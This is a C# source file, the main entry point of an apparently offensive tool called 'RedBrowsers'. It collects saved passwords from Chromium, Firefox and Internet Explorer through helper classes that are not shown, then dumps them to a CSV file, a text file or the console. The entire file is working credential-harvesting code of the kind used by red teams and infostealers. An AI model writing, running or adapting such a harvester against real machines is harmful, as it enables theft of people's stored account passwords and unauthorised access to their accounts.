using System;
using System.Collections.Generic;
using System.IO;
using RedBrowsers.Utlis;
using static RedBrowsers.Utlis.Utlis;

namespace RedBrowsers
{
     static class Program
    {
        static void Main(string[] args)
        {
            List<ExtractedCredentials> Credentials = ChromiumEngine.ChromiumStorage.ReadPasswords();
            Credentials.AddRange(Firefox.FirefoxStorage.ReadPasswords());
            Credentials.AddRange(InternetExplorer.IEStorage.ReadPasswords());
            if (!(args.Length == 0))
            {
                switch (args[0].ToUpper())
                {
                    case "CSV":
                        {

                            try
                            {
                                CreateCSV(Credentials, args[1]);
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex.Message);
                            }
                            break;
                        }
                    case "TXT":
                        {
                            try
                            {
                                File.WriteAllText(args[1], CreateString(Credentials));
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex.Message);
                            }
                            break;
                        }
                }
            }
            else
            {
                Console.WriteLine(CreateString(Credentials));
            }

            Console.ReadLine();
        }

    }


}

